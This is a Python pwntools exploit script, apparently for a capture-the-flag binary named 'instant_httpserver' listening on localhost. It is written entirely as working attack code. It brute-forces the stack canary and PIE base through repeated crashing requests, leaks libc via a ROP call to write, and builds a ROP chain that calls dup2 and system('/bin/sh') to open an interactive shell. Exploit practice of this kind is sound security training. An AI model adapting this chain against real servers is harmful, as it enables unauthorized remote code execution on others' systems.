#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./instant_httpserver"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()


if len(argv) >= 2 and argv[1] == "r":
    print("remote")
elif len(argv) >= 2 and argv[1] == "d":
    cmd = """
        #set follow-fork-mode child
        b __stack_chk_fail
		c
    """
    p = gdb.debug(chall,cmd)
else:
    p = process(chall)

# bruteforce canary
def leak_canary():
    canary = b''
    guess = 0
    header = b"GET"
    header += b'A' * 0x205

    while (len(canary) < 8):
        r = remote("localhost", 4445)
        payload = header
        payload += canary
        payload += p8(guess)
        r.send(payload)
        responce = r.recvall()
        r.close()
        if b"<br /><br /><hr><I>instant_httpserver -- localhost</I>" in responce:
            canary += p8(guess)
            guess = 0
            continue
        else:
            guess += 1
            continue

    canary = u64(canary, endian="big")
    return canary

# leak proc base(bypass PIE)
def leak_text_base():
    text_base = b'\xe5'# last 1byte is not ramdomized
    guess = 0
    header = b"GET"
    header += b'A' * 0x205

    while (len(text_base) < 6):
        r = remote("localhost", 4445)
        payload = header
        payload += p64(canary, endian="big")
        payload += p64(0xdeadbeef)# padding(saved RBP)
        payload += text_base
        payload += p8(guess)
        r.send(payload)
        responce = r.recvall()
        r.close()
        if responce.count(b"Server: instant_httpserver") > 1:
            text_base += p8(guess)
            guess = 0
            continue
        else:
            guess += 1
            continue

    text_base = u64((text_base + b"\x00\x00")) - 0xde5
    return text_base

#canary = 0x6c0520368fa088
canary = leak_canary()
log.info("canary: 0x{:08x}".format(canary))
#text_base = 0x555555400000
text_base = leak_text_base()
log.info("text_base: 0x{:08x}".format(text_base))

# libc base leak
header = b"GET"
header += b'A' * 0x205

payload = header
payload += p64(canary, endian="big")
payload += p64(0xdeadbeef)# save rbp
payload += p64(text_base + 0x00000e91)# pop rsi: pop r15; ret
payload += p64(text_base + elf.got['write'])
payload += p64(0xdeadbeef)
payload += p64(text_base + elf.plt['write'])

r = remote("localhost", 4445)
r.send(payload)
r.recvuntil(b"<html>Your Req Length is 520")
libc_base = u64(r.recv(8)) - libc.symbols['write']
#libc_base = 0x7ffff79e2000
log.info("libc_base: 0x{:08x}".format(libc_base))
r.close()

# get shell
payload = header
payload += p64(canary, endian="big")
payload += p64(0xdeadbeef)# saved rbp
payload += p64(text_base + 0xe91)# pop rsi: pop r15; ret
payload += p64(1)
payload += p64(0xdeadbeef)
payload += p64(libc_base + libc.symbols['dup2'])
payload += p64(text_base + 0xe91)# pop rsi: pop r15; ret
payload += p64(0)
payload += p64(0xdeadbeef)
payload += p64(libc_base + libc.symbols['dup2'])
payload += p64(text_base + 0xe93)# pop rdi; ret
payload += p64(libc_base + list(libc.search(b"/bin/sh"))[0])
payload += p64(text_base + 0xe94)# ret (for stack alignment)
payload += p64(libc_base + libc.symbols['system'])

r = remote("localhost", 4445)
r.send(payload)

r.interactive()
